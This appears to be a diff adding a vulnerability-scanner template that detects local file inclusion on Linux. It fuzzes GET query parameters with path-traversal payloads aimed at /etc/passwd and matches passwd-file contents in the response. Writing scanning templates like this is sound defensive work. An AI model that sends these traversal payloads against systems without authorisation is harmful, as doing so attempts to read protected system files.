@@ -1,0 +1,40 @@
+id: linux-lfi-enhanced
+
+info:
+  name: Local File Inclusion - Linux (Enhanced)
+  author: skalvin
+  severity: high
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+  tags: lfi,dast,linux
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      nix_fuzz:
+        - '/etc/passwd'
+        - '../../etc/passwd'
+        - '../../../etc/passwd'
+        - '/../../../../etc/passwd'
+
+    fuzzing:
+      - part: query
+        type: replace # replaces existing parameter value with fuzz payload
+        mode: single # replaces only one parameter value with fuzz payload
+        fuzz:
+          - '{{nix_fuzz}}'
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+          - '/bin/bash'
+          - 'Daemon:.*:1:1:'
+
